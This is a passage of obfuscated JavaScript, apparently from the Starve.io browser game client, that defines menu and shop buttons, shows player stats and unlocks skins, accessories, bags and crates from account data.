			this.buttons[ᐃⲆ] = Δⵠⵠ(497, 72, "", [ⲆΔ.ⵠⵠⲆⵠΔⵠⲆ, ⲆΔ.ⲆᐃᐃⵠΔⵠⵠ, ⲆΔ.ΔᐃᐃⵠⲆᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⵠⵠᐃΔΔⲆΔⵠ()
			}), -130, 390, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃΔᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(497, 72, "", [ⲆΔ.ᐃΔⲆΔΔᐃᐃ, ⲆΔ.ᐃΔᐃⲆΔΔΔ, ⲆΔ.ⲆⲆⵠⲆⲆⲆΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ⲆⵠᐃⵠⲆⲆⲆⲆᐃ()
			}), -130, 430, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃΔᐃⵠ;
			ⵠⵠⵠᐃⲆⵠⵠ = 2e4;

			function ΔᐃΔⲆⲆⲆΔ(ᐃⵠᐃⵠⵠ) {
				var ᐃⵠΔⵠᐃ = ⵠⲆᐃΔ.ᐃΔⲆⵠᐃΔⵠ(ᐃⵠᐃⵠⵠ);
				var ΔΔⲆⵠᐃⵠᐃ = ᐃⵠΔⵠᐃ * ᐃⵠΔⵠᐃ * ⵠⵠⵠᐃⲆⵠⵠ;
				var ⵠⲆᐃⲆΔⵠΔΔΔ = (ᐃⵠΔⵠᐃ + 1) * (ᐃⵠΔⵠᐃ + 1) * ⵠⵠⵠᐃⲆⵠⵠ - ΔΔⲆⵠᐃⵠᐃ;
				ᐃⵠᐃⵠⵠ -= ΔΔⲆⵠᐃⵠᐃ;
				return ᐃⵠᐃⵠⵠ / ⵠⲆᐃⲆΔⵠΔΔΔ
			}
			this.ΔᐃΔⲆⲆⲆΔ = ΔᐃΔⲆⲆⲆΔ;

			function ᐃΔⲆⵠᐃΔⵠ(ᐃⵠᐃⵠⵠ) {
				return Math.floor(Math.sqrt(ᐃⵠᐃⵠⵠ / ⵠⵠⵠᐃⲆⵠⵠ))
			}
			this.ᐃΔⲆⵠᐃΔⵠ = ᐃΔⲆⵠᐃΔⵠ;
			this.ⵠⲆⲆⵠⲆⲆⵠⲆΔ = function(ᐃⵠᐃⵠⵠ) {
				ⵠⲆᐃΔ.ᐃⵠΔⵠᐃ = ⵠⲆᐃΔ.ᐃΔⲆⵠᐃΔⵠ(ᐃⵠᐃⵠⵠ);
				ⵠⲆᐃΔ.ⵠⵠᐃⲆΔᐃΔ = ⵠⲆᐃΔ.ΔᐃΔⲆⲆⲆΔ(ᐃⵠᐃⵠⵠ);
				ⵠⲆᐃΔ.ΔΔⵠΔⲆⵠᐃ = 0;
				ⵠⲆᐃΔ.ᐃⵠᐃⵠⵠ = ᐃⵠᐃⵠⵠ
			};

			function ᐃⲆⵠΔΔ(ᐃΔ, ⲆⲆᐃⵠⵠ) {
				if (ⲆⲆᐃⵠⵠ !== ᐃᐃⵠᐃᐃ) {
					ⵠⲆᐃΔ.ⵠⲆᐃⲆΔⵠᐃ = ⲆⲆᐃⵠⵠ;
					var ΔᐃⵠΔΔ = ⵠⲆᐃΔ.ⲆΔⲆΔⲆΔⲆ[ⲆⲆᐃⵠⵠ];
					ⵠⲆᐃΔ.ᐃⵠᐃⵠⵠ = ΔᐃⵠΔΔ[ⵠ[326]];
					ⵠⲆᐃΔ.ⲆᐃᐃⲆᐃ = ΔᐃⵠΔΔ["kill"];
					ⵠⲆᐃΔ.ᐃⵠⲆᐃΔⵠΔ = ΔᐃⵠΔΔ["death"];
					ⵠⲆᐃΔ.time = ΔᐃⵠΔΔ[ⵠ[299]];
					ⵠⲆᐃΔ.ⲆⵠΔⵠⲆᐃⵠ = ΔᐃⵠΔΔ["bestScore"];
					ⵠⲆᐃΔ.ⵠᐃᐃⵠΔΔᐃ = ΔᐃⵠΔΔ["bestKill"];
					ⵠⲆᐃΔ.ΔᐃⵠΔⵠΔⲆ = ΔᐃⵠΔΔ["bestTime"];
					ⵠⲆᐃΔ.ⵠⵠΔⲆᐃⲆⵠ = ΔᐃⵠΔΔ["scoreTotal"]
				}
				ᐃΔ === ⲆⵠᐃⲆⲆ && (ᐃΔ = ⵠⲆᐃΔ.ⵠⲆΔⲆΔⲆⵠ);
				ⵠⲆᐃΔ.ⵠⲆΔⲆΔⲆⵠ = ᐃΔ;
				if (ᐃΔ >= ΔΔⵠ) {
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("stats_box_time")[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠⲆᐃΔ.ΔᐃⵠΔⵠΔⲆ[ᐃΔ];
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("stats_box_kill")[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠⲆᐃΔ.ⵠᐃᐃⵠΔΔᐃ[ᐃΔ];
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("stats_box_score")[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠⲆᐃΔ.ⲆⵠΔⵠⲆᐃⵠ[ᐃΔ]
				} else {
					var ⲆᐃᐃⲆᐃ = 0;
					for (var ⵠᐃ = Δⵠᐃ; ⵠᐃ < ⵠⲆᐃΔ.ⲆᐃᐃⲆᐃ.length; ⵠᐃ++) ⲆᐃᐃⲆᐃ += ⵠⲆᐃΔ.ⲆᐃᐃⲆᐃ[ⵠᐃ];
					var Δᐃᐃ = 0;
					for (var ⵠᐃ = ΔⲆⵠⲆ; ⵠᐃ < ⵠⲆᐃΔ.time.length; ⵠᐃ++) Δᐃᐃ += ⵠⲆᐃΔ.time[ⵠᐃ];
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("stats_box_time")[ΔᐃⲆⵠⲆⵠΔ[290]] = Δᐃᐃ;
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("stats_box_kill")[ΔᐃⲆⵠⲆⵠΔ[290]] = ⲆᐃᐃⲆᐃ;
					document[ΔᐃⲆⵠⲆⵠΔ[68]]("stats_box_score")[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠⲆᐃΔ.ᐃⵠᐃⵠⵠ
				}
			}
			this.ΔⲆⲆΔⲆⵠΔⵠΔ = function(ΔⲆⵠΔ) {
				ⵠⲆᐃΔ.buttons[ⵠⲆᐃΔ.ᐃⵠⲆΔⵠⲆⵠ].info.active = ᐃⵠΔ;
				ⵠⲆᐃΔ.buttons[ⵠⲆᐃΔ.ΔⲆᐃΔⵠⲆᐃ].info.active = ⲆⵠⲆⲆ;
				ⵠⲆᐃΔ.buttons[ⵠⲆᐃΔ.ⲆᐃᐃᐃΔᐃⵠ].info.active = ΔⵠΔⵠ;
				ⲆΔⲆΔⵠΔⲆ();
				if (-1 === ΔⲆⵠΔ[ⵠ[163]].indexOf("Starver#")) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[83]).value = ᐃⲆᐃΔᐃⵠᐃ["decodeURIComponent"](ᐃⲆᐃΔᐃⵠᐃ["escape"](ᐃⲆᐃΔᐃⵠᐃ["atob"](ΔⲆⵠΔ[ⵠ[163]])));
				else document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[83]).value = ΔⲆⵠΔ[ⵠ[163]];
				ⵠⲆᐃΔ.ᐃᐃⵠⵠᐃ = ΔⲆⵠΔ["bread"];
				var ⲆΔⲆΔⲆΔⲆ = ΔⲆⵠΔ["seasons"];
				var ΔᐃⵠΔΔ = ⲆΔⲆΔⲆΔⲆ[ⲆΔⲆΔⲆΔⲆ.length - 1];
				ⵠⲆᐃΔ.ⲆΔⲆΔⲆΔⲆ = ⲆΔⲆΔⲆΔⲆ;
				ᐃᐃᐃ.ⵠⲆⲆⵠⲆⲆⵠⲆΔ(ΔᐃⵠΔΔ[ⵠ[326]]);
				ⵠⲆᐃΔ.ᐃⵠᐃⵠⵠ = ΔᐃⵠΔΔ[ⵠ[326]];
				ⵠⲆᐃΔ.ⲆᐃᐃⲆᐃ = ΔᐃⵠΔΔ["kill"];
				ⵠⲆᐃΔ.ᐃⵠⲆᐃΔⵠΔ = ΔᐃⵠΔΔ["death"];
				ⵠⲆᐃΔ.time = ΔᐃⵠΔΔ[ⵠ[299]];
				ⵠⲆᐃΔ.ⲆⵠΔⵠⲆᐃⵠ = ΔᐃⵠΔΔ["bestScore"];
				ⵠⲆᐃΔ.ⵠᐃᐃⵠΔΔᐃ = ΔᐃⵠΔΔ["bestKill"];
				ⵠⲆᐃΔ.ΔᐃⵠΔⵠΔⲆ = ΔᐃⵠΔΔ["bestTime"];
				ⵠⲆᐃΔ.ⵠⵠΔⲆᐃⲆⵠ = ΔᐃⵠΔΔ["scoreTotal"];
				ⵠⲆᐃΔ.ΔᐃΔᐃⵠⵠⲆ = ΔⲆⵠΔ["firstName"];
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[378]).value = ΔⲆⵠΔ["privateServerRegion"] + ⵠ[517] + ΔⲆⵠΔ["privateServer"];
				undefined === ⵠⲆᐃΔ.ΔᐃΔᐃⵠⵠⲆ && (ⵠⲆᐃΔ.ΔᐃΔᐃⵠⵠⲆ = 0);
				ⵠⲆᐃΔ.ⲆⲆᐃΔΔᐃⵠ = Date.now() + ΔⲆⵠΔ["privateServerTime"];
				Number(ΔⲆⵠΔ["privateServerTime"]) > ⲆΔⵠ && (ⵠⲆᐃΔ.ⲆⲆᐃΔΔᐃⵠ = Date.now() + Number(ΔⲆⵠΔ["privateServerTime"]));
				ⵠⲆᐃΔ.ᐃⵠΔΔᐃ = Date.now() + ΔⲆⵠΔ[ⵠ[198]];
				if (ⵠⲆⲆ < Number(ΔⲆⵠΔ[ⵠ[198]])) ⵠⲆᐃΔ.ᐃⵠΔΔᐃ = Date.now() + Number(ΔⲆⵠΔ[ⵠ[198]]);
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ᐃⵠⲆⲆᐃ;
				for (var ⵠᐃ = ΔΔⵠⵠ; ⵠᐃ < ΔⲆⵠΔ["skins"].length; ⵠᐃ++) {
					var ΔᐃΔ = ΔⲆⵠΔ["skins"][ⵠᐃ];
					if (0 < ΔᐃΔ) {
						for (var ᐃⵠᐃⵠ = 0; ᐃⵠᐃⵠ < ΔΔᐃⲆᐃ.length; ᐃⵠᐃⵠ++) {
							if (ΔΔᐃⲆᐃ[ᐃⵠᐃⵠ].id === ⵠᐃ) ᐃᐃᐃ.unlock.ⲆⵠⲆᐃ[ᐃⵠᐃⵠ] = 1
						}
					}
				}
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ⲆⲆᐃᐃᐃ;
				for (var ⵠᐃ = 0; ΔⲆⵠΔ["accessories"].length > ⵠᐃ; ⵠᐃ++) {
					var ΔᐃΔ = ΔⲆⵠΔ["accessories"][ⵠᐃ];
					if (0 < ΔᐃΔ) {
						for (var ᐃⵠᐃⵠ = Ⲇᐃᐃᐃ; ᐃⵠᐃⵠ < ΔΔᐃⲆᐃ.length; ᐃⵠᐃⵠ++) {
							if (ⵠᐃ === ΔΔᐃⲆᐃ[ᐃⵠᐃⵠ].id) ᐃᐃᐃ.unlock.Δᐃᐃⵠᐃ[ᐃⵠᐃⵠ] = ⲆⵠⲆⲆ
						}
					}
				}
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ⵠⵠⲆⵠⲆ;
				for (var ⵠᐃ = ΔΔⵠ; ΔⲆⵠΔ["books"].length > ⵠᐃ; ⵠᐃ++) {
					var ΔᐃΔ = ΔⲆⵠΔ["books"][ⵠᐃ];
					if (ⵠⲆⲆ < ΔᐃΔ) {
						for (var ᐃⵠᐃⵠ = 0; ᐃⵠᐃⵠ < ΔΔᐃⲆᐃ.length; ᐃⵠᐃⵠ++) {
							if (ΔΔᐃⲆᐃ[ᐃⵠᐃⵠ].id === ⵠᐃ) ᐃᐃᐃ.unlock.ⵠⲆᐃⵠⵠ[ᐃⵠᐃⵠ] = ΔᐃⲆⵠ
						}
					}
				}
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ⵠᐃᐃⵠ;
				for (var ⵠᐃ = ΔᐃΔΔ; ΔⲆⵠΔ["bags"].length > ⵠᐃ; ⵠᐃ++) {
					var ΔᐃΔ = ΔⲆⵠΔ["bags"][ⵠᐃ];
					if (ΔᐃΔ > 0) {
						for (var ᐃⵠᐃⵠ = 0; ᐃⵠᐃⵠ < ΔΔᐃⲆᐃ.length; ᐃⵠᐃⵠ++) {
							ΔΔᐃⲆᐃ[ᐃⵠᐃⵠ].id === ⵠᐃ && (ᐃᐃᐃ.unlock.ΔⵠΔᐃⲆ[ᐃⵠᐃⵠ] = 1)
						}
					}
				}
				var ΔΔᐃⲆᐃ = ᐃⲆⵠⲆ.ⲆᐃⲆΔᐃ;
				for (var ⵠᐃ = Δⵠᐃ; ΔⲆⵠΔ["crates"].length > ⵠᐃ; ⵠᐃ++) {
					var ΔᐃΔ = ΔⲆⵠΔ["crates"][ⵠᐃ];
					if (Ⲇᐃᐃᐃ < ΔᐃΔ) {
						for (var ᐃⵠᐃⵠ = 0; ᐃⵠᐃⵠ < ΔΔᐃⲆᐃ.length; ᐃⵠᐃⵠ++) {
							ⵠᐃ === ΔΔᐃⲆᐃ[ᐃⵠᐃⵠ].id && (ᐃᐃᐃ.unlock.ⲆᐃⲆⲆᐃ[ᐃⵠᐃⵠ] = 1, ᐃᐃᐃ.unlock.ᐃⲆⵠΔⵠ[ᐃⵠᐃⵠ] = 1)
						}
					}
				}
			};
			this.ΔⵠⵠΔΔΔΔⲆⵠ = function() {
				ᐃⲆᐃΔᐃⵠᐃ.ⵠⲆⵠⲆᐃΔᐃ = function() {
					ⲆΔᐃⵠ(ⲆⵠΔΔΔ);
					ᐃΔⵠⵠⲆᐃⲆⲆⲆ(ᐃᐃᐃ.ΔⲆⲆΔⲆⵠΔⵠΔ)
				};
				ΔⵠⲆᐃΔⵠⲆ === 1 && ᐃⲆᐃΔᐃⵠᐃ.ⵠⲆⵠⲆᐃΔᐃ()
			};
			ᐃⲆᐃΔᐃⵠᐃ.ⲆᐃⲆⵠΔᐃᐃᐃᐃ = function() {
				ⵠⲆᐃΔ.buttons[ⵠⲆᐃΔ.ᐃⵠⲆΔⵠⲆⵠ].info.active = 1;
				ⵠⲆᐃΔ.buttons[ⵠⲆᐃΔ.ΔⲆᐃΔⵠⲆᐃ].info.active = 0;
				ⵠⲆᐃΔ.buttons[ⵠⲆᐃΔ.ⲆᐃᐃᐃΔᐃⵠ].info.active = Δⵠᐃ;
				ⲆΔᐃⵠ(ⲆⵠΔΔΔ)
			};
			this.ᐃΔΔⲆᐃ = function() {
				return ⵠⲆᐃΔ.buttons[ⵠⲆᐃΔ.ΔⲆᐃΔⵠⲆᐃ].info.active
			};
			this.buttons[ᐃⲆ] = Δⵠⵠ(461, 105, "", [ⲆΔ.ⵠΔΔΔⵠⲆΔ, ⲆΔ.ⲆⲆᐃⵠᐃⲆᐃ, ⲆΔ.ⲆᐃⵠⵠⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				if (ᐃᐃᐃ.ᐃΔΔⲆᐃ()) ⲆΔᐃⵠ(ᐃⲆᐃⵠᐃ);
				else ⲆΔᐃⵠ(ᐃᐃΔᐃⵠ)
			}), -ⲆᐃⵠΔΔⲆⲆ, 80, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ΔᐃⵠⵠΔ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(157, 158, "", [ⲆΔ.ⲆⲆΔΔⲆΔΔ, ⲆΔ.ⵠΔΔⵠⲆⵠᐃ, ⲆΔ.ⲆⲆᐃⵠⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]("https://starveiopro.wikia.com/wiki/", ⵠ[513])
			}), -35, 125, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃᐃⲆᐃᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(66, 73, "", [ⲆΔ.ᐃⵠΔⲆⲆⲆΔ, ⲆΔ.ⵠⲆⵠᐃⲆⲆⲆ, ⲆΔ.ⲆⲆᐃⵠᐃⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -68, 340, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃᐃⲆᐃᐃⵠ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(66, 73, "", [ⲆΔ.ᐃᐃΔᐃΔΔⵠ, ⲆΔ.ΔⵠΔΔⵠᐃΔ, ⲆΔ.ᐃΔΔᐃⵠᐃⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, undefined, -30, 340, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃᐃᐃⲆᐃᐃⵠ;
			this.ΔⲆΔⵠΔΔᐃⵠᐃ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(97, 66, "", [ⲆΔ.ΔⲆⵠᐃⲆⵠᐃ, ⲆΔ.ΔᐃΔⵠᐃⲆΔ, ⲆΔ.ᐃⲆⵠᐃⲆᐃⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(undefined, ᐃⵠᐃⵠᐃ, ⵠⲆᐃΔ.ⲆⲆⵠⲆⲆⵠᐃ)
			}), -ⲆⵠⵠᐃⲆⲆΔ, 151, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ᐃⵠⵠᐃᐃⲆⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(135, 66, "", [ⲆΔ.ᐃΔⵠΔⲆⵠΔ, ⲆΔ.ᐃΔⵠⵠᐃΔΔ, ⲆΔ.ΔΔΔⵠᐃΔΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(undefined, ⲆΔⵠⲆⲆ, ⵠⲆᐃΔ.ᐃⵠⵠᐃᐃⲆⲆ)
			}), 37.5, 151, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ⵠⲆᐃΔᐃⲆⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(160, 66, "", [ⲆΔ.ᐃᐃΔᐃᐃΔⲆ, ⲆΔ.ΔᐃⲆᐃᐃⲆΔ, ⲆΔ.ᐃⲆⵠΔⲆΔⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(undefined, ⵠⵠⵠⲆⵠ, ⵠⲆᐃΔ.ⵠⲆᐃΔᐃⲆⲆ)
			}), 107.5, 151, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ⲆⲆⵠⲆⲆⵠᐃ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(207, 66, "", [ⲆΔ.ⲆᐃⲆΔⵠⲆΔ, ⲆΔ.ⲆⲆᐃⵠⲆΔⵠ, ⲆΔ.ⵠᐃᐃⵠΔⲆΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(undefined, undefined, ⵠⲆᐃΔ.ⲆⲆⵠⲆⲆⵠᐃ)
			}), 190.5, 151, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ⵠΔΔᐃⲆⲆⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(144, 66, "", [ⲆΔ.ΔΔⲆⵠⲆⵠⲆ, ⲆΔ.ΔᐃⲆⵠᐃΔᐃ, ⲆΔ.ⵠⵠᐃⵠᐃⲆⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ⵠⲆᐃΔ.ⵠΔΔᐃⲆⲆⵠ)
			}), 103.5, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ⲆⵠⵠⵠΔΔᐃ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(124, 66, "", [ⲆΔ.ⲆΔⵠΔⲆᐃⵠ, ⲆΔ.ⲆᐃⲆᐃΔⵠⵠ, ⲆΔ.ⲆᐃᐃⲆᐃⲆᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ⵠⲆᐃΔ.ⲆⵠⵠⵠΔΔᐃ)
			}), 177.5, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ᐃΔΔΔⵠᐃⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(104, 66, "", [ⲆΔ.ⲆⵠᐃᐃᐃΔΔ, ⲆΔ.ᐃⵠⲆᐃᐃᐃᐃ, ⲆΔ.ᐃΔΔⵠΔᐃΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ⵠⲆᐃΔ.ᐃΔΔΔⵠᐃⵠ)
			}), 242, 110, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ΔΔⲆⵠᐃΔⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ᐃΔⲆⵠⲆⲆΔ, ⲆΔ.ΔⵠⵠᐃΔⵠᐃ, ⲆΔ.ⲆⵠᐃᐃⲆΔᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ᐃᐃⵠⵠΔ, undefined, ⲆΔΔΔⲆ, ⵠⲆᐃΔ.ΔΔⲆⵠᐃΔⲆ)
			}), -185, 528, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ΔΔⵠΔΔΔⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ᐃΔᐃᐃΔΔΔ, ⲆΔ.ⵠⵠᐃⲆᐃⲆⲆ, ⲆΔ.ⲆⲆᐃⵠΔⲆΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ⵠⵠΔⵠΔ, undefined, ⵠᐃⵠⲆΔ, ⵠⲆᐃΔ.ΔΔⵠΔΔΔⲆ)
			}), -149, 528, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ⲆᐃΔⲆΔⲆᐃ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ᐃᐃⲆⲆᐃᐃⵠ, ⲆΔ.ⲆΔΔΔⵠᐃΔ, ⲆΔ.ⵠⵠᐃⲆⵠⵠᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ⵠᐃⵠⲆΔ, ⵠⵠⵠⲆⵠ, ⲆⵠᐃⲆⲆ, ⵠⲆᐃΔ.ⲆᐃΔⲆΔⲆᐃ)
			}), -113, 528, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ⵠᐃᐃΔⵠⲆⲆ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ⲆⲆⵠⲆᐃⵠⲆ, ⲆΔ.ᐃᐃⲆⲆΔⲆΔ, ⲆΔ.ⵠᐃⲆⵠΔⲆΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ⲆΔᐃᐃᐃ, undefined, undefined, ⵠⲆᐃΔ.ⵠᐃᐃΔⵠⲆⲆ)
			}), -77, 528, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ᐃᐃⵠᐃᐃⲆⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ⵠⲆΔⲆⲆΔⲆ, ⲆΔ.ᐃⲆᐃⵠⲆⲆⵠ, ⲆΔ.ⲆⵠⲆⵠⲆⵠⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ⲆᐃΔⲆᐃ, undefined, ᐃᐃⵠⵠΔ, ⵠⲆᐃΔ.ᐃᐃⵠᐃᐃⲆⵠ)
			}), -41, 528, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.ΔⵠΔⲆᐃΔⵠ = ᐃⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(46, 51, "", [ⲆΔ.ⲆΔᐃⲆⲆⲆⵠ, ⲆΔ.ᐃⲆⲆΔᐃᐃⲆ, ⲆΔ.ⲆⲆᐃⵠⵠᐃᐃ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ᐃⲆΔⵠᐃ(ⲆⲆⲆⵠⵠ, undefined, undefined, ⵠⲆᐃΔ.ΔⵠΔⲆᐃΔⵠ)
			}), -5, 528, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆⵠⲆⲆ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(232, 352, "", [ⲆΔ.ⲆΔⵠᐃⵠⲆⲆ, ⲆΔ.ᐃΔΔⲆⲆΔⵠ, ⲆΔ.ⲆᐃⲆΔᐃⲆⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆᐃᐃⵠᐃⵠ(300)
			}), -330, 135, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(232, 352, "", [ⲆΔ.ⵠᐃᐃᐃᐃⲆⲆ, ⲆΔ.ⵠⲆΔⲆΔⵠᐃ, ⲆΔ.ⲆⲆᐃⲆᐃⵠⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆᐃᐃⵠᐃⵠ(600)
			}), -195, 135, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(243, 374, "", [ⲆΔ.ⲆΔᐃΔⲆⲆᐃ, ⲆΔ.ⲆⲆⲆⲆⵠⲆⲆ, ⲆΔ.ⲆΔΔⲆⵠⲆⵠ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆᐃᐃⵠᐃⵠ(2600)
			}), -60, 130, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(232, 352, "", [ⲆΔ.ⲆΔⲆᐃᐃⵠⵠ, ⲆΔ.ⲆΔᐃΔΔⵠⲆ, ⲆΔ.ᐃⵠΔⲆⵠⲆΔ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆᐃᐃⵠᐃⵠ(7e3)
			}), 78, 135, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠᐃ;
			this.buttons[ᐃⲆ] = Δⵠⵠ(243, 374, "", [ⲆΔ.ΔᐃᐃᐃⵠΔⵠ, ⲆΔ.ⵠΔᐃᐃⵠΔᐃ, ⲆΔ.ⲆⵠΔᐃΔⲆⲆ], ᐃΔⲆⵠ, Ⲇⵠᐃᐃ, (function() {
				ΔⲆᐃᐃⵠᐃⵠ(2e4)
			}), 213, 130, ΔⲆⲆⵠ | ⲆΔⵠⲆ, ⲆᐃⲆⲆ);
			this.buttons[ᐃⲆ++].view = ᐃⲆᐃⵠᐃ;
